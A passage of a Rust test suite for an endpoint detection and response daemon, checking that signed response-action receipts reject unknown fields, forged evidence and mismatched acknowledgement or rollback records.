    use super::*;
    use crate::daemon::{AuditQueue, DaemonConfig};
    use clawdstrike_policy_event::edr::{
        CodeSignatureStatus, CredentialKind, EndpointEvent, EndpointProcess, FileOperation,
        HoneyArtifactKind, PackageManager, SignatureTrust,
    };
    use std::collections::BTreeMap;
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicU64, Ordering};
    use tower::ServiceExt;

    static TEST_POLICY_COUNTER: AtomicU64 = AtomicU64::new(0);

    #[test]
    fn response_execution_archive_family_allows_lifecycle_receipts() {
        assert!(receipt_family_allows_multiple_archive_members(
            "response_execution"
        ));
        assert!(!receipt_family_allows_multiple_archive_members(
            "response_request"
        ));
        assert!(!receipt_family_allows_multiple_archive_members(
            "evidence_bundle_manifest"
        ));
    }

    fn response_action_actor_input() -> serde_json::Value {
        serde_json::json!({
            "userId": "operator:test",
            "sessionId": "session-response-action",
            "agentId": "agent-api:test",
            "workloadId": "endpoint-response-engine",
            "approvalId": "approval-response-action"
        })
    }

    #[test]
    fn live_response_actor_requires_approval_id() {
        let actor_without_approval = EdrResponseActionActorInput {
            endpoint_id: "endpoint-test".to_string(),
            user_id: Some("operator:test".to_string()),
            session_id: Some("session-response-action".to_string()),
            agent_id: Some("agent-api:test".to_string()),
            workload_id: Some("endpoint-response-engine".to_string()),
            approval_id: None,
            ..EdrResponseActionActorInput::default()
        };

        let err = validate_response_action_actor(Some(&actor_without_approval)).unwrap_err();

        assert_eq!(err.0, StatusCode::BAD_REQUEST);
        assert!(err.1.contains("approvalId"));
    }

    #[test]
    fn edr_receipt_signer_requires_enrollment_for_cloud_connected_modes() {
        let mut settings = Settings::default();
        assert!(!edr_receipt_signer_requires_enrollment(&settings));

        settings.enrollment.enrolled = true;
        assert!(edr_receipt_signer_requires_enrollment(&settings));

        settings.enrollment.enrolled = false;
        settings.nats.enabled = true;
        assert!(edr_receipt_signer_requires_enrollment(&settings));

        settings.nats.enabled = false;
        settings.control_api.enabled = true;
        assert!(edr_receipt_signer_requires_enrollment(&settings));
    }

    #[tokio::test]
    async fn cloud_mode_rejects_local_edr_receipt_signer() {
        let mut state = test_state();
        {
            let mut settings = state.settings.write().await;
            settings.control_api.enabled = true;
        }
        let keypair = Keypair::from_seed(&[222u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger::transient(
            keypair,
            format!("local-edr:{signer_public_key}"),
        )));
        let state = Arc::new(state);

        let err = require_cloud_mode_enrolled_receipt_signer(&state, "test cloud upload")
            .await
            .unwrap_err();
        assert_eq!(err.0, StatusCode::CONFLICT);
        assert!(err.1.contains("enrolled EDR receipt signer"));
    }

    fn assert_unknown_field_rejected<T>(payload: serde_json::Value, field: &str)
    where
        T: serde::de::DeserializeOwned + std::fmt::Debug,
    {
        let err = match serde_json::from_value::<T>(payload) {
            Ok(_) => panic!("request body accepted unknown field {field}"),
            Err(err) => err,
        };
        let message = err.to_string();
        assert!(
            message.contains("unknown field"),
            "expected unknown-field serde error for {field}, got {message}"
        );
        assert!(
            message.contains(field),
            "serde error should name rejected field {field}: {message}"
        );
    }

    fn assert_anyhow_error_mentions_unknown_field(err: anyhow::Error, field: &str) {
        let chain = err
            .chain()
            .map(std::string::ToString::to_string)
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            chain.contains("unknown field") && chain.contains(field),
            "expected unknown field {field} to be rejected, got {chain}"
        );
    }

    fn write_jsonl_value(path: &std::path::Path, value: &serde_json::Value) {
        let mut bytes = serde_json::to_vec(value)
            .unwrap_or_else(|e| panic!("failed to serialize JSONL test value: {e}"));
        bytes.push(b'\n');
        std::fs::write(path, bytes)
            .unwrap_or_else(|e| panic!("failed to write JSONL test value: {e}"));
    }

    #[test]
    fn response_execution_proof_verifier_rejects_invalid_endpoint_decision_metadata() {
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-proof-verify-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "proof.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://proof.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&observation);
        let process_node_id = observation.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap_or_else(|| panic!("missing response proof subgraph"));
        let plan = EndpointResponsePlan::dry_run(
            EndpointDecisionAction::RestrictEgress,
            &process_node_id,
            &subgraph,
            600,
            "model response proof verification",
        );
        let keypair = Keypair::from_seed(&[81u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut endpoint_receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 81,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: EndpointDecisionActor {
                    endpoint_id: "endpoint-1".to_string(),
                    user_id: Some("operator:test".to_string()),
                    session_id: Some("session-proof-verify".to_string()),
                    agent_id: Some("agent-api:test".to_string()),
                    workload_id: Some("endpoint-response-engine".to_string()),
                    ..EndpointDecisionActor::default()
                },
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &plan,
                graph: &subgraph,
            });
        endpoint_receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let valid_signed = endpoint_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| panic!("failed to sign valid endpoint receipt: {err}"));
        verify_endpoint_receipt_signature(
            &valid_signed,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_or_else(|err| panic!("valid endpoint receipt failed verification: {err}"));

        let endpoint_decision_value = serde_json::to_value(&endpoint_receipt)
            .unwrap_or_else(|err| panic!("failed to serialize endpoint receipt metadata: {err}"));
        let content_hash_drift = hush_core::Receipt::new(
            sha256(b"wrong endpoint decision metadata"),
            hush_core::Verdict::pass(),
        )
        .with_id(endpoint_receipt.receipt_id())
        .with_metadata(serde_json::json!({
            "endpointDecision": endpoint_decision_value.clone()
        }));
        let content_hash_drift = SignedReceipt::sign_with(content_hash_drift, &keypair)
            .unwrap_or_else(|err| panic!("failed to sign content-hash drift receipt: {err}"));
        let err = verify_endpoint_receipt_signature(
            &content_hash_drift,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("content hash"),
            "expected content-hash binding error, got {err}"
        );

        let mut unknown_endpoint_decision_value = endpoint_decision_value.clone();
        unknown_endpoint_decision_value["unsignedExtra"] =
            serde_json::Value::String("must not be ignored".to_string());
        let canonical = canonicalize_json(&unknown_endpoint_decision_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize unknown-field endpoint metadata: {err}")
        });
        let unknown_field_receipt =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": unknown_endpoint_decision_value
                }));
        let unknown_field_receipt = SignedReceipt::sign_with(unknown_field_receipt, &keypair)
            .unwrap_or_else(|err| panic!("failed to sign unknown-field endpoint receipt: {err}"));
        let err = verify_endpoint_receipt_signature(
            &unknown_field_receipt,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid") && err.contains("unsignedExtra"),
            "expected unknown endpoint receipt field error, got {err}"
        );

        let mut unknown_clock_value = endpoint_decision_value.clone();
        unknown_clock_value["clock"]["shadowUncertaintyMs"] = serde_json::Value::Number(7.into());
        let canonical = canonicalize_json(&unknown_clock_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize unknown-clock endpoint metadata: {err}")
        });
        let unknown_clock_receipt =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": unknown_clock_value
                }));
        let unknown_clock_receipt = SignedReceipt::sign_with(unknown_clock_receipt, &keypair)
            .unwrap_or_else(|err| panic!("failed to sign unknown-clock endpoint receipt: {err}"));
        let err = verify_endpoint_receipt_signature(
            &unknown_clock_receipt,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid")
                && err.contains("shadowUncertaintyMs"),
            "expected unknown endpoint clock field error, got {err}"
        );

        let mut unknown_actor_value = endpoint_decision_value.clone();
        unknown_actor_value["actor"]["shadowSessionId"] =
            serde_json::Value::String("must not be ignored".to_string());
        let canonical = canonicalize_json(&unknown_actor_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize unknown-actor endpoint metadata: {err}")
        });
        let unknown_actor_receipt =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": unknown_actor_value
                }));
        let unknown_actor_receipt = SignedReceipt::sign_with(unknown_actor_receipt, &keypair)
            .unwrap_or_else(|err| panic!("failed to sign unknown-actor endpoint receipt: {err}"));
        let err = verify_endpoint_receipt_signature(
            &unknown_actor_receipt,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid")
                && err.contains("shadowSessionId"),
            "expected unknown endpoint actor field error, got {err}"
        );

        let mut unknown_decision_value = endpoint_decision_value.clone();
        unknown_decision_value["decision"]["shadowAction"] =
            serde_json::Value::String("allow".to_string());
        let canonical = canonicalize_json(&unknown_decision_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize unknown-decision endpoint metadata: {err}")
        });
        let unknown_decision_receipt =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": unknown_decision_value
                }));
        let unknown_decision_receipt = SignedReceipt::sign_with(unknown_decision_receipt, &keypair)
            .unwrap_or_else(|err| {
                panic!("failed to sign unknown-decision endpoint receipt: {err}")
            });
        let err = verify_endpoint_receipt_signature(
            &unknown_decision_receipt,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid") && err.contains("shadowAction"),
            "expected unknown endpoint decision field error, got {err}"
        );

        let mut unknown_policy_value = endpoint_decision_value.clone();
        unknown_policy_value["policy"]["shadowPolicyEpoch"] = serde_json::Value::Number(8.into());
        let canonical = canonicalize_json(&unknown_policy_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize unknown-policy endpoint metadata: {err}")
        });
        let unknown_policy_receipt =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": unknown_policy_value
                }));
        let unknown_policy_receipt = SignedReceipt::sign_with(unknown_policy_receipt, &keypair)
            .unwrap_or_else(|err| panic!("failed to sign unknown-policy endpoint receipt: {err}"));
        let err = verify_endpoint_receipt_signature(
            &unknown_policy_receipt,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid")
                && err.contains("shadowPolicyEpoch"),
            "expected unknown endpoint policy field error, got {err}"
        );

        let mut unknown_signer_value = endpoint_decision_value.clone();
        unknown_signer_value["signer"]["shadowSignerPublicKey"] =
            serde_json::Value::String("must not be ignored".to_string());
        let canonical = canonicalize_json(&unknown_signer_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize unknown-signer endpoint metadata: {err}")
        });
        let unknown_signer_receipt =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": unknown_signer_value
                }));
        let unknown_signer_receipt = SignedReceipt::sign_with(unknown_signer_receipt, &keypair)
            .unwrap_or_else(|err| panic!("failed to sign unknown-signer endpoint receipt: {err}"));
        let err = verify_endpoint_receipt_signature(
            &unknown_signer_receipt,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid")
                && err.contains("shadowSignerPublicKey"),
            "expected unknown endpoint signer field error, got {err}"
        );

        let mut unknown_graph_value = endpoint_decision_value.clone();
        unknown_graph_value["graph"]["shadowGraphSliceId"] =
            serde_json::Value::String("must not be ignored".to_string());
        let canonical = canonicalize_json(&unknown_graph_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize unknown-graph endpoint metadata: {err}")
        });
        let unknown_graph_receipt =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": unknown_graph_value
                }));
        let unknown_graph_receipt = SignedReceipt::sign_with(unknown_graph_receipt, &keypair)
            .unwrap_or_else(|err| panic!("failed to sign unknown-graph endpoint receipt: {err}"));
        let err = verify_endpoint_receipt_signature(
            &unknown_graph_receipt,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid")
                && err.contains("shadowGraphSliceId"),
            "expected unknown endpoint graph field error, got {err}"
        );

        let mut unknown_sensor_state_value = endpoint_decision_value.clone();
        unknown_sensor_state_value["sensorState"]["shadowProviderCount"] =
            serde_json::Value::Number(1.into());
        let canonical = canonicalize_json(&unknown_sensor_state_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize unknown-sensor-state endpoint metadata: {err}")
        });
        let unknown_sensor_state_receipt =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": unknown_sensor_state_value
                }));
        let unknown_sensor_state_receipt =
            SignedReceipt::sign_with(unknown_sensor_state_receipt, &keypair).unwrap_or_else(
                |err| panic!("failed to sign unknown-sensor-state endpoint receipt: {err}"),
            );
        let err = verify_endpoint_receipt_signature(
            &unknown_sensor_state_receipt,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid")
                && err.contains("shadowProviderCount"),
            "expected unknown endpoint sensor state field error, got {err}"
        );

        let mut unknown_provider_state_value = endpoint_decision_value.clone();
        unknown_provider_state_value["sensorState"]["providers"][0]["shadowRuntimeStatus"] =
            serde_json::Value::String("must not be ignored".to_string());
        let canonical = canonicalize_json(&unknown_provider_state_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize unknown-provider-state endpoint metadata: {err}")
        });
        let unknown_provider_state_receipt =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": unknown_provider_state_value
                }));
        let unknown_provider_state_receipt =
            SignedReceipt::sign_with(unknown_provider_state_receipt, &keypair).unwrap_or_else(
                |err| panic!("failed to sign unknown-provider-state endpoint receipt: {err}"),
            );
        let err = verify_endpoint_receipt_signature(
            &unknown_provider_state_receipt,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid")
                && err.contains("shadowRuntimeStatus"),
            "expected unknown endpoint provider state field error, got {err}"
        );

        let mut invalid_endpoint_decision_value = endpoint_decision_value;
        invalid_endpoint_decision_value["policy"]["policyHash"] =
            serde_json::Value::String("not-a-hash".to_string());
        let canonical = canonicalize_json(&invalid_endpoint_decision_value).unwrap_or_else(|err| {
            panic!("failed to canonicalize invalid endpoint metadata: {err}")
        });
        let semantically_invalid =
            hush_core::Receipt::new(sha256(canonical.as_bytes()), hush_core::Verdict::pass())
                .with_id(endpoint_receipt.receipt_id())
                .with_metadata(serde_json::json!({
                    "endpointDecision": invalid_endpoint_decision_value
                }));
        let semantically_invalid = SignedReceipt::sign_with(semantically_invalid, &keypair)
            .unwrap_or_else(|err| panic!("failed to sign invalid endpoint receipt: {err}"));
        let err = verify_endpoint_receipt_signature(
            &semantically_invalid,
            "response request receipt",
            &signer_public_key,
        )
        .unwrap_err();
        assert!(
            err.contains("endpoint decision metadata is invalid"),
            "expected semantic endpoint receipt validation error, got {err}"
        );
    }

    #[test]
    fn response_execution_proof_contract_rejects_mismatched_lifecycle_receipts() {
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-proof-contract-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "contract.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://contract.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&observation);
        let process_node_id = observation.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap_or_else(|| panic!("missing response proof contract subgraph"));
        let plan = EndpointResponsePlan::restrict_egress_execution(
            &process_node_id,
            &subgraph,
            600,
            "restrict egress for contract proof evidence",
        );
        let targets = vec!["contract.example.invalid:443".to_string()];
        let mut execution =
            EndpointResponseExecutionReport::restrict_egress(&plan, &subgraph, &targets)
                .unwrap_or_else(|err| panic!("failed to build proof contract execution: {err}"));
        execution.actor = Some(EndpointDecisionActor {
            endpoint_id: "endpoint-1".to_string(),
            user_id: Some("operator:test".to_string()),
            session_id: Some("session-proof-contract".to_string()),
            agent_id: Some("agent-api:test".to_string()),
            workload_id: Some("endpoint-response-engine".to_string()),
            ..EndpointDecisionActor::default()
        });
        let keypair = Keypair::from_seed(&[82u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let policy = EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        };
        let sensor_state = EndpointSensorState::single_active_agent("agent-api:test");
        let actor = execution
            .actor
            .clone()
            .unwrap_or_else(|| panic!("missing proof contract actor"));

        let mut request_receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 82,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: actor.clone(),
                policy: policy.clone(),
                sensor_state: sensor_state.clone(),
                plan: &plan,
                graph: &subgraph,
            });
        request_receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let request_receipt = request_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| panic!("failed to sign request proof receipt: {err}"));
        let mut execution_receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 83,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: actor.clone(),
                policy: policy.clone(),
                sensor_state: sensor_state.clone(),
                execution: &execution,
                graph: &subgraph,
            },
        );
        execution_receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let execution_receipt = execution_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| panic!("failed to sign execution proof receipt: {err}"));
        let mut bundle_receipt = EndpointDecisionReceipt::for_evidence_bundle_manifest(
            EndpointEvidenceBundleManifestReceiptInput {
                local_sequence: 84,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: policy.clone(),
                sensor_state: sensor_state.clone(),
                root_node_id: execution.root_node_id.as_str(),
                bundle: &execution.evidence_bundle,
                graph: &subgraph,
            },
        );
        bundle_receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let bundle_receipt = bundle_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| panic!("failed to sign bundle proof receipt: {err}"));
        verify_response_execution_proof_contract(
            &execution,
            &request_receipt,
            &execution_receipt,
            &bundle_receipt,
            &[],
            &[],
            &[],
        )
        .unwrap_or_else(|err| panic!("valid proof contract failed verification: {err:?}"));
        let canonical_subgraph = canonical_evidence_graph(&subgraph)
            .unwrap_or_else(|err| panic!("failed to canonicalize proof contract graph: {err}"));
        let stored_bundle = StoredEndpointEvidenceBundle {
            bundle: execution.evidence_bundle.clone(),
            path: Some("/tmp/proof-contract-bundle.json".to_string()),
            byte_count: canonical_subgraph.byte_count,
            graph: subgraph.clone(),
        };
        verify_response_execution_proof_evidence_bundle(&execution, &stored_bundle).unwrap_or_else(
            |err| panic!("valid proof evidence bundle failed verification: {err:?}"),
        );
        let mut mismatched_byte_count_bundle = stored_bundle.clone();
        mismatched_byte_count_bundle.byte_count += 1;
        let err = verify_response_execution_proof_evidence_bundle(
            &execution,
            &mismatched_byte_count_bundle,
        )
        .unwrap_err();
        assert_eq!(err.0, StatusCode::CONFLICT);
        assert!(
            err.1.contains("byte count"),
            "expected stored bundle byte-count proof contract error, got {}",
            err.1
        );

        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("operator acknowledged proof contract".to_string()),
            chrono::Utc::now(),
        );
        let mut acknowledgement_receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 85,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: actor.clone(),
                policy: policy.clone(),
                sensor_state: sensor_state.clone(),
                acknowledgement: &acknowledgement,
                graph: &subgraph,
            },
        );
        acknowledgement_receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let acknowledgement_receipt = acknowledgement_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| panic!("failed to sign acknowledgement proof receipt: {err}"));
        verify_endpoint_receipt_signature(
            &acknowledgement_receipt,
            "response acknowledgement receipt",
            &signer_public_key,
        )
        .unwrap_or_else(|err| panic!("valid acknowledgement receipt failed verification: {err}"));
        verify_response_execution_proof_contract(
            &execution,
            &request_receipt,
            &execution_receipt,
            &bundle_receipt,
            &[],
            &[],
            std::slice::from_ref(&acknowledgement_receipt),
        )
        .unwrap_or_else(|err| {
            panic!("valid acknowledgement proof contract failed verification: {err:?}")
        });

        let mut mismatched_acknowledgement = acknowledgement.clone();
        mismatched_acknowledgement.status = EndpointResponseExecutionStatus::Failed;
        mismatched_acknowledgement.summary =
            "Acknowledged response execution with mismatched status.".to_string();
        let mut mismatched_acknowledgement_receipt =
            EndpointDecisionReceipt::for_response_acknowledgement(
                EndpointResponseAcknowledgementReceiptInput {
                    local_sequence: 86,
                    endpoint_id: "endpoint-1",
                    signer_identity: "local-edr:endpoint-1",
                    actor: actor.clone(),
                    policy: policy.clone(),
                    sensor_state: sensor_state.clone(),
                    acknowledgement: &mismatched_acknowledgement,
                    graph: &subgraph,
                },
            );
        mismatched_acknowledgement_receipt.signer.signer_public_key =
            Some(signer_public_key.clone());
        let mismatched_acknowledgement_receipt = mismatched_acknowledgement_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| {
                panic!("failed to sign mismatched acknowledgement proof receipt: {err}")
            });
        verify_endpoint_receipt_signature(
            &mismatched_acknowledgement_receipt,
            "response acknowledgement receipt",
            &signer_public_key,
        )
        .unwrap_or_else(|err| {
            panic!("mismatched acknowledgement receipt should be semantically valid: {err}")
        });
        let err = verify_response_execution_proof_contract(
            &execution,
            &request_receipt,
            &execution_receipt,
            &bundle_receipt,
            &[],
            &[],
            std::slice::from_ref(&mismatched_acknowledgement_receipt),
        )
        .unwrap_err();
        assert_eq!(err.0, StatusCode::CONFLICT);
        assert!(
            err.1
                .contains("response acknowledgement receipt acknowledgedStatus"),
            "expected acknowledgement status proof contract error, got {}",
            err.1
        );

        let forged_targets = vec!["forged-contract.example.invalid:443".to_string()];
        let mut mismatched_effect_execution = execution.clone();
        mismatched_effect_execution.effects =
            vec![EndpointResponseExecutionEffect::restrict_egress(
                &forged_targets[0],
                &forged_targets,
            )];
        let mismatched_effect_acknowledgement =
            EndpointResponseAcknowledgementReport::from_execution(
                &mismatched_effect_execution,
                "operator:test",
                Some("operator acknowledged mismatched proof effect".to_string()),
                chrono::Utc::now(),
            );
        let mut mismatched_effect_acknowledgement_receipt =
            EndpointDecisionReceipt::for_response_acknowledgement(
                EndpointResponseAcknowledgementReceiptInput {
                    local_sequence: 87,
                    endpoint_id: "endpoint-1",
                    signer_identity: "local-edr:endpoint-1",
                    actor: actor.clone(),
                    policy: policy.clone(),
                    sensor_state: sensor_state.clone(),
                    acknowledgement: &mismatched_effect_acknowledgement,
                    graph: &subgraph,
                },
            );
        mismatched_effect_acknowledgement_receipt
            .signer
            .signer_public_key = Some(signer_public_key.clone());
        let mismatched_effect_acknowledgement_receipt = mismatched_effect_acknowledgement_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| {
                panic!("failed to sign mismatched acknowledgement-effect proof receipt: {err}")
            });
        verify_endpoint_receipt_signature(
            &mismatched_effect_acknowledgement_receipt,
            "response acknowledgement receipt",
            &signer_public_key,
        )
        .unwrap_or_else(|err| {
            panic!("mismatched acknowledgement-effect receipt should be semantically valid: {err}")
        });
        let err = verify_response_execution_proof_contract(
            &execution,
            &request_receipt,
            &execution_receipt,
            &bundle_receipt,
            &[],
            &[],
            std::slice::from_ref(&mismatched_effect_acknowledgement_receipt),
        )
        .unwrap_err();
        assert_eq!(err.0, StatusCode::CONFLICT);
        assert!(
            err.1
                .contains("response acknowledgement receipt acknowledgementEffect"),
            "expected acknowledgement effect proof contract error, got {}",
            err.1
        );

        let rollback = EndpointResponseRollbackReport::restrict_egress(
            &execution,
            "operator rolled back proof contract egress",
            chrono::Utc::now(),
        )
        .unwrap_or_else(|err| panic!("failed to build valid proof rollback: {err}"));
        let mut rollback_receipt =
            EndpointDecisionReceipt::for_response_rollback(EndpointResponseRollbackReceiptInput {
                local_sequence: 88,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: actor.clone(),
                policy: policy.clone(),
                sensor_state: sensor_state.clone(),
                rollback: &rollback,
                graph: &subgraph,
            });
        rollback_receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let rollback_receipt = rollback_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| panic!("failed to sign valid proof rollback receipt: {err}"));
        verify_endpoint_receipt_signature(
            &rollback_receipt,
            "response rollback receipt",
            &signer_public_key,
        )
        .unwrap_or_else(|err| panic!("valid rollback receipt failed verification: {err}"));
        verify_response_execution_proof_contract(
            &execution,
            &request_receipt,
            &execution_receipt,
            &bundle_receipt,
            &[],
            std::slice::from_ref(&rollback_receipt),
            &[],
        )
        .unwrap_or_else(|err| panic!("valid rollback proof contract failed verification: {err:?}"));

        let mut mismatched_rollback_execution = execution.clone();
        mismatched_rollback_execution.effects =
            vec![EndpointResponseExecutionEffect::restrict_egress(
                &forged_targets[0],
                &forged_targets,
            )];
        let mismatched_rollback = EndpointResponseRollbackReport::restrict_egress(
            &mismatched_rollback_execution,
            "operator rolled back mismatched proof contract egress",
            chrono::Utc::now(),
        )
        .unwrap_or_else(|err| panic!("failed to build mismatched proof rollback: {err}"));
        let mut mismatched_rollback_receipt =
            EndpointDecisionReceipt::for_response_rollback(EndpointResponseRollbackReceiptInput {
                local_sequence: 89,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: actor.clone(),
                policy: policy.clone(),
                sensor_state: sensor_state.clone(),
                rollback: &mismatched_rollback,
                graph: &subgraph,
            });
        mismatched_rollback_receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let mismatched_rollback_receipt = mismatched_rollback_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| {
                panic!("failed to sign mismatched proof rollback receipt: {err}")
            });
        verify_endpoint_receipt_signature(
            &mismatched_rollback_receipt,
            "response rollback receipt",
            &signer_public_key,
        )
        .unwrap_or_else(|err| {
            panic!("mismatched rollback receipt should be semantically valid: {err}")
        });
        let err = verify_response_execution_proof_contract(
            &execution,
            &request_receipt,
            &execution_receipt,
            &bundle_receipt,
            &[],
            std::slice::from_ref(&mismatched_rollback_receipt),
            &[],
        )
        .unwrap_err();
        assert_eq!(err.0, StatusCode::CONFLICT);
        assert!(
            err.1.contains("response rollback receipt rollbackEffect"),
            "expected rollback effect proof contract error, got {}",
            err.1
        );

        let forged_observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-proof-contract-forged".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "forged-contract.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://forged-contract.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let mut forged_recorder = CausalGraphRecorder::new();
        forged_recorder.record_observation(&forged_observation);
        let forged_root_node_id = forged_observation.process.stable_node_id();
        let forged_subgraph = forged_recorder
            .graph()
            .causal_subgraph_from(&forged_root_node_id, 3)
            .unwrap_or_else(|| panic!("missing forged proof contract subgraph"));
        let forged_graph_ref =
            EndpointGraphReference::for_subgraph(&forged_root_node_id, &forged_subgraph);
        let forged_bundle = EndpointEvidenceBundleReference {
            bundle_id: execution.evidence_bundle.bundle_id.clone(),
            graph_slice_id: forged_graph_ref
                .graph_slice_id
                .unwrap_or_else(|| panic!("missing forged graph slice id")),
            content_hash: forged_graph_ref
                .content_hash
                .unwrap_or_else(|| panic!("missing forged graph content hash")),
            node_count: forged_subgraph.nodes.len(),
            edge_count: forged_subgraph.edges.len(),
            created_at: chrono::Utc::now(),
        };
